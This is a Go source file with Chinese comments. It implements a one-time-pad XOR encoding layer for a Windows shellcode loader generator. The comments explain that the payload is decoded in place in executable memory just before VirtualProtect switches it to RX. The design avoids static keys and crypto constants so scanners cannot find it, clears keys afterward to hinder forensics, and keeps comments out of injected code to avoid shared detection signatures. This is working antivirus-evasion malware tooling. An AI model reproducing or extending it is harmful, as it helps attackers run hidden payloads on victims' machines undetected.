package encode

import (
	"crypto/rand"
	"errors"
)

// ============================================================================
// OTP 一次一密编码（就地解码层，参考 SGN 的"自解码载荷"思路的纯 Go 等价实现）
//
// 编码后文件内容 = [ 密文 N 字节 ][ 全长随机密钥 N 字节 ]，共 2N 字节。
// 与 AES/XOR/ChaCha20 的关键差异：不在 Go 堆内"解密出明文"再拷贝，
// 而是把 密文‖密钥 原样拷贝进 RW 执行页后，在 VirtualProtect 翻 RX **之前**
// 由生成期注入的 Go 代码就地 XOR 解码并清零密钥半区：
//   - 静态：文件中不存在可被提取后本地解密的短密钥/固定算法模式，
//     密文与密钥等长且每次随机，无算法常量特征（AES S盒/ChaCha常量等）；
//   - 运行期：明文窗口仅在解码循环内短暂出现，密钥区解码后被立即清零，
//     堆上的 密文‖密钥 副本随模板既有逻辑（拷后清零 byteArray）一并抹除。
// 仅适用于含 "RtlMoveMemory -> VirtualProtect" 拷贝序列的一体模板（Windows）。
// ============================================================================

// OtpDecodeString 结构同 XorDecodeString/AesDecodeString：
// [0]=import 段（无需额外依赖）、[1]=函数段（函数型回退用，见 GenGoFile）、
// [2]=main 内联段（就地型：仅把 blob 赋给 byteArray，解码由注入完成）。
// 注：函数体/内联代码不写任何说明性注释——注释不会被标识符随机化处理，
// 残留固定中文注释会形成样本间共享特征。
var OtpDecodeString = []string{``, `
func OtpBlobDecode(otpData []byte) []byte {
	if len(otpData)%2 != 0 {
		return otpData
	}
	otpN := len(otpData) / 2
	for otpI := 0; otpI < otpN; otpI++ {
		otpData[otpI] ^= otpData[otpN+otpI]
	}
	for otpI := otpN; otpI < len(otpData); otpI++ {
		otpData[otpI] = 0
	}
	return otpData[:otpN]
}
`, `
	byteArray := //__DATA_OtpEncrypted__`}

// OtpEncrypt 生成 密文‖密钥 拼接 blob（长度 = 2*len(plain)）。
// 密钥为 crypto/rand 全长随机，与密文等长，构成一次一密。
func OtpEncrypt(plain []byte) ([]byte, error) {
	n := len(plain)
	if n == 0 {
		return nil, errors.New("载荷为空")
	}
	key := make([]byte, n)
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}
	blob := make([]byte, 2*n)
	for i := 0; i < n; i++ {
		blob[i] = plain[i] ^ key[i]
	}
	copy(blob[n:], key)
	return blob, nil
}

// OtpDecrypt 是 Go 侧的参考解码实现（仅测试/校验用）。
// 与生成期注入到 loader 内的就地解码逻辑保持一致：
// 前 n 字节与后 n 字节逐一异或还原明文。
func OtpDecrypt(blob []byte) ([]byte, error) {
	if len(blob)%2 != 0 {
		return nil, errors.New("OTP blob 长度必须为偶数")
	}
	n := len(blob) / 2
	out := make([]byte, n)
	for i := 0; i < n; i++ {
		out[i] = blob[i] ^ blob[n+i]
	}
	return out, nil
}
